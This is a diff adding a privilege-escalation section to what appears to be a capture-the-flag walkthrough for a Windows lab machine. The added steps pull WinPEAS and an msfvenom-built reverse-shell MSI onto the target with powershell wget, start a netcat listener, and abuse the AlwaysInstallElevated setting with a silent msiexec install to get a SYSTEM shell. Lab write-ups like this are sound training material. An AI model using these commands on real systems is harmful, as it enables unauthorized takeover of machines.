@@ -254,16 +254,45 @@ type \users\phoebe\desktop\user.txt
 ````
 <img width="1917" height="152" alt="image" src="https://github.com/user-attachments/assets/6e9320c1-64b8-4bf4-a5e6-3bec1d5ebc8d" />
 
-For enumeration we are going to use WinPEAS. Go to https://github.com/peass-ng/PEASS-ng and enter the WinPEAS folder:
+For enumeration we are going to use WinPEAS. Go to https://github.com/peass-ng/PEASS-ng/releases/tag/20260908-dffb9496 and download the winPEASany.exe:
 <img width="1060" height="796" alt="image" src="https://github.com/user-attachments/assets/0f9ee5a7-9ac7-48ff-8d77-4cad25f51f54" />
 
-There download winpeas.exe and move it into te same folder you have the python server running:
+Move it into te same folder you have the python server running or start a new server where you downloaded winPEASany.exe and send a resquest for it from the attacked machine:
+Copy paste this into the windows revshell taking care to place your ip before running the command:
+````
+powershell wget http://<your-ip>:8000/winPEASany.exe -outfile wp.exe
+````
+<img width="1917" height="415" alt="image" src="https://github.com/user-attachments/assets/13c3150c-6364-4e87-831c-aaac8f03787d" />
 
+Now run wp.exe. Notice that AllwaysInstallElevated is set to 1:
+<img width="1917" height="105" alt="image" src="https://github.com/user-attachments/assets/0aa93b82-65f6-4d2a-ae9c-c8e535d9fce1" />
 
+These registry keys tell windows that a user of any privilege can install .msi files are NT AUTHORITY\SYSTEM. So all we need to do is create a malicious .msi file, and run it.
+Copy-paste this into your bash terminal:
+````
+msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=<you-ip> LPORT=443 -f msi -o rev.msi
+````
+This results in a rev.msi file. Move it into the same directorie where the python server is running or open a new python server (don't forget to close the last one). Then download re rev.msi file into windows, same as you did with winpeas:
+````
+powershell wget http://<your-ip>:8000/rev.msi -outfile rev.msi
+````
 
+Then open a new netcat listener;
+````
+nc -lnvp 443
+````
+Then go back to the windows machine and execute it:
+````
+msiexec /quiet /qn /i rev.msi
+````
 
+You should have the shell back to you:
+<img width="1912" height="108" alt="image" src="https://github.com/user-attachments/assets/2f95dfe1-e782-42d3-a904-57b66ee089da" />
 
-
+Now just type the root.txt:
+````
+type \users\administrator\desktop\root.txt
+````
 
 
 
